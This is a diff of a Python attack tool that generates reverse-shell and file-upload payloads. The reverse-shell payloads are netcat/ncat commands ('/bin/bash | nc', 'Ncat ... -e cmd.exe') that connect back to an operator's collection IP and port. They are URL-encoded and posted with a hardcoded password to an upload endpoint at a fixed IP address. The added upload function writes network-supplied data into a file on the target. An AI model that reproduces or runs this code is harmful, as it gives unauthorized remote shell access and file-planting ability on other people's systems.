@@ -23,7 +23,7 @@ def main():
     #Reverse Shell Payload
     if(args.payloadChoice == "RShell"):
         print("Reverse Shell payload generator.")
-        shellDestination = "http://131.151.162.100:63412/upload"
+        shellDestination = "http://131.151.162.95:63412/upload"
         variables = "pass=abc321&payload="
         ReverseShell(systemVariables, args.collectionIP, args.collectionPort, shellDestination, variables, args.targetArch)
 
@@ -32,7 +32,9 @@ def main():
         print("Execute")
 
     #File-upload Payload
-    if(args.payloadChoice == "upload"):
+    if(args.payloadChoice == "Upload"):
+        variables = "pass=abc321&payload="
+        GenFileUpload("input", variables, args.collectionIP, args.collectionPort)
         print("Upload")
 
     #File-download Payload
@@ -51,16 +53,27 @@ def ReverseShell(systemVariables, collectionIP, collectionPort, shellDestination
     if(systemVariables['OS'] == 'Windows'):
         newShell = "start cmd.exe @cmd /k"
         localNetCat = f'{systemVariables["Ncat"]} -l -p {collectionPort}'
+
     if(targetArch == "ubuntux86"):
         payload = "/bin/bash | nc {0} {1}".format(collectionIP, collectionPort)
     elif(targetArch == "Windows"):
         payload = "Ncat {0} {1} -e cmd.exe".format(collectionIP, collectionPort)
 
     with open('CMDTemplates/RShell', 'r') as file:
-        RShellPayloadText = file.read().format(newShell, localNetCat, variables, payload.replace(' ', '%20'), shellDestination)
+        RShellPayloadText = file.read().format(newShell, localNetCat, variables, payload.replace(' ', '%%20'), shellDestination)
 
     f = open("RShell.cmd", "w")
     f.write(RShellPayloadText)
+    f.close()
+    return
+
+def GenFileUpload(uploadFile, variables, collectionIP, collectionPort):
+    uploadcmd = "nc {0} {1} > {2}".format(collectionIP, collectionPort, uploadFile).replace(' ', "%%20")
+    with open('CMDTemplates/Upload', 'r') as file:
+        UploadPayloadText = file.read().format(collectionPort, uploadFile, variables, uploadcmd)
+
+    f = open("Upload.cmd", "w")
+    f.write(UploadPayloadText)
     f.close()
     return
 
